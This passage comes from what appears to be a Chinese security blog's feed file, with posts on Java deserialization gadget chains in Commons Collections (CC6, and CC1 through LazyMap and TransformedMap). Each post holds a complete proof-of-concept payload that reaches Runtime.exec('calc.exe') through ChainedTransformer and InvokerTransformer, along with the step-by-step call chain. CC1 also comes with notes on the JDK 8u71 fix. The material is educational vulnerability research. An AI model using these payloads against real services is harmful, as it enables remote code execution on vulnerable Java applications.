class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>outerMap<span class="token punctuation">,</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> expMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        expMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        outerMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//3</span>        <span class="token class-name">Field</span> factoryField <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factoryField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factoryField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>outerMap<span class="token punctuation">,</span>transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//4</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>expMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h3><p>payload主要分为4个部分:</p><p>1.构造命令执行的恶意类，即获得Runtime.getRuntime().exec(“calc”);</p><p>2.构造反序列化的利用链</p><p>3.为了保证本地不触发命令，在put之后再更改LazyMap中factory的值</p><p>4.生成反序列化流并序列化</p><h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><p>CC6中新用到的一个类。Entry可以简单理解为一个键值对，Map是多个键值对。</p><h4 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h4><p>这次我们反方向来分析，通过<a href="https://outlaws-bai.github.io/2022/07/09/java-sec-03-cc1-way2/">cc1-way2</a>，我们可以知道只要想办法通过反序列化调用LazyMap#get()，并使其运行到factory.transform(key)这里，就能触发命令执行，因为factory使我们构造好的ChainedTransformer。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220716162106822.png" alt="image-20220716162106822"></p><p>那么按照这个思路，应该去找调用了LazyMap#get()的点，这里直接分析结果吧，先行者们已经帮我们找到了TiedMapEntry，TiedMapEntry#getValue()会调用，只要使得其中的map是LazyMap即可</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220716161218387.png" alt="image-20220716161218387"></p><p>继续找调用了TiedMapEntry#getValue()的方法，可以看到TiedMapEntry#hashCode()就调用了getValue()</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220716162119403.png" alt="image-20220716162119403"></p><p>看到hashCode我们就想到了<a href="https://outlaws-bai.github.io/2022/07/01/java-sec-01-urldns/">URLDNS</a>，当HashMap#readObject()被调用时，会调用它的hash()。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220716162354087.png" alt="image-20220716162354087"></p><p>而hash()又会调用当前HashMap中key的hashCode()方法</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220716162559697.png" alt="image-20220716162559697"></p><p>因此只要使得HashMap中的key为TiedMapEntry的实例化对象，就可以将整个链条串起来。</p><h3 id="细节点"><a href="#细节点" class="headerlink" title="细节点"></a>细节点</h3><h4 id="第2部分代码为什么要remove-“key”"><a href="#第2部分代码为什么要remove-“key”" class="headerlink" title="第2部分代码为什么要remove(“key”)"></a>第2部分代码为什么要remove(“key”)</h4><p>我们去掉这块代码运行会发现无法触发计算器，我们跟进调试会发现在LazyMap#get()并没有走入if中</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220716163225198.png" alt="image-20220716163225198"></p><p>因为LazyMap的map中已经存在key，那么怎么解决呢，remove就可以了。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">outerMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的原因我们也看一下，在LazyMap#get()中打一个断点，我们会发现这里被调用了两次，第一次进入了if，第二次没有进入。第一次进入if有个put操作，会将key put进LazyMap中，第二次当然就不进入了。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220716164702577.png" alt="image-20220716164702577"></p><p>那么这里为什么第一次会被调用呢，继续寻找其实问题出在</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">expMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>HashMap#put()会调用HashMap#hash()，再走到LazyMap#get()方法，相当于把我们的反序列化流程都走了一遍，导致了LazyMap#get()在反序列化时LazyMap的map已经有一个key了。</p><h4 id="为什么有第3部分代码"><a href="#为什么有第3部分代码" class="headerlink" title="为什么有第3部分代码"></a>为什么有第3部分代码</h4><p>这里有两个变动，一个原来在CC1中我们会直接将生成的ChainedTransformer用于初始化LazyMap</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而在这里我们传入了一个无用的ChainedTransformer</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另一个就是多了第3部分代码。</p><p>其实理解了上边为什么要remove就可以理解了。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">expMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会导致在本地走了一遍我们构造好的反序列化链从而导致本地会触发一次，所以我们选择在put前传入一个无用的ChainedTransformer，在put之后再利用第3段代码，修改LazyMap中的factory变量。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><pre class="line-numbers language-none"><code class="language-none">ObjectInputStream#readObject()HashMap#readObject()HashMap#hash()TiedMapEntry#hashCode()TiedMapEntry#getValue()LazyMap#get()ChainedTransformer#transform()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> cc6 </tag>
            
            <tag> LazyMap </tag>
            
            <tag> TiedMapEntry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-sec: 03. cc1-way2</title>
      <link href="/2022/07/09/java-sec-03-cc1-way2/"/>
      <url>/2022/07/09/java-sec-03-cc1-way2/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonCollections1-way2"><a href="#CommonCollections1-way2" class="headerlink" title="CommonCollections1 - way2"></a>CommonCollections1 - way2</h1><h2 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h2><p>JDK8 version &lt; 8u71</p><h2 id="完整payload"><a href="#完整payload" class="headerlink" title="完整payload"></a>完整payload</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRCEByLazyMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token comment">// 生成序列化流，在8u71前有效</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc.exe"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> construct <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        construct<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> outerMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span> proxyMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span> <span class="token operator">?</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> proxyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        System.out.println(barr);</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h3><p>与上一篇文章<a href="https://outlaws-bai.github.io/2022/07/03/java-sec-02-cc1/">cc1-TransformedMap</a>不同之处主要在于LazyMap</p><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的 factory.transform() ，factory.transform就会执行我们构造好的transformerChain导致rce。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709163230790.png" alt="image-20220709163230790"></p><p>在<a href="https://outlaws-bai.github.io/2022/07/03/java-sec-02-cc1/">cc1-TransformedMap</a>中我们是利用sun.reflect.annotation.AnnotationInvocationHandler的readObject()方法执行了put操作，进而执行TransformedMap中我们的回调transformerChain，从而导致rce。而在LazyMap的利用中我们发现sun.reflect.annotation.AnnotationInvocationHandler的readObject()方法并没有直接执行LazyMap的get方法，但在invoke方法中发现有调用，因此可以用到代理</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709163902696.png" alt="image-20220709163902696"></p><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>示例代码参考<a href="https://github.com/outlaws-bai/java-sec/tree/main/src/main/java/com/outlaws/basic/proxy">java基础-proxy</a></p><p>FileSystem是一个interface仅有一个list列文件方法。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709165457960.png" alt="image-20220709165457960"></p><p>UnixFileSystem实现了FileSystem接口。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709165505415.png" alt="image-20220709165505415"></p><p>JDKInvocationHandler是一个代理类，实现了对被代理对象的方法处理逻辑。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709165512255.png" alt="image-20220709165512255"></p><p>FileSystemProxyTest测试整个代理流程</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709165522189.png" alt="image-20220709165522189"></p><p>执行结果如下</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709171848090.png" alt="image-20220709171848090"></p><p>我们不难发现在被代理的对象UnixFileSystem中每个方法执行的时候，都会调用JDKInvocationHandler的invoke()方法，因此知道这点就不难理解整个利用链了</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><pre class="line-numbers language-none"><code class="language-none">sun.reflect.annotation.AnnotationInvocationHandler#readObject()sun.reflect.annotation.AnnotationInvocationHandler#invoke()LazyMap#get()ChainedTransformer#transform()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>sun.reflect.annotation.AnnotationInvocationHandler#readObject()中会调用LazyMap中的方法，而我们对LazyMap中的方法进行了代理，使得它的所有方法被执行前都会先执行sun.reflect.annotation.AnnotationInvocationHandler#invoke()方法，sun.reflect.annotation.AnnotationInvocationHandler#invoke()方法会调用LazyMap#get()从而调用ChainedTransformer#transform()，触发rce。</p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>我们发现这个gadget也是只能在8u71以下使用，对比下官方的修复发现</p><p>在8u71以下sun.reflect.annotation.AnnotationInvocationHandler的属性memberValues来源于初始化时传入的第二个参数，即LazyMap的实例化对象outerMap，并且在readObject也不会对其属性就行改变</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709171716396.png" alt="image-20220709171716396"></p><p>而在8u71以上虽然memberValues也是初始化的第二个参数，但是我们发现在sun.reflect.annotation.AnnotationInvocationHandler#readObject()</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709171132174.png" alt="image-20220709171132174"></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709171155551.png" alt="image-20220709171155551"></p><p>它会把memberValues修改为LinkedHashMap，这样的话在sun.reflect.annotation.AnnotationInvocationHandler#invoke()中的get操作不会是调用LazyMap#get()方法，而是变成了LinkedHashMap#get()，从而修复了该条利用链。</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20220709172615414.png" alt="image-20220709172615414"></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> cc1 </tag>
            
            <tag> LazyMap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-sec: 02. cc1</title>
      <link href="/2022/07/03/java-sec-02-cc1/"/>
      <url>/2022/07/03/java-sec-02-cc1/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonCollections1"><a href="#CommonCollections1" class="headerlink" title="CommonCollections1"></a>CommonCollections1</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>引入依赖</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;commons-collections&lt;/groupId&gt;    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;    &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>降低JDK版本低于8u71</p><h2 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h2><p>JDK8 version &lt; 8u71</p><h2 id="完整payload"><a href="#完整payload" class="headerlink" title="完整payload"></a>完整payload</h2><p>这里以P神的demo分析</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRCEByTransformedMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token comment">// 生成序列化流，在8u71前有效</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token 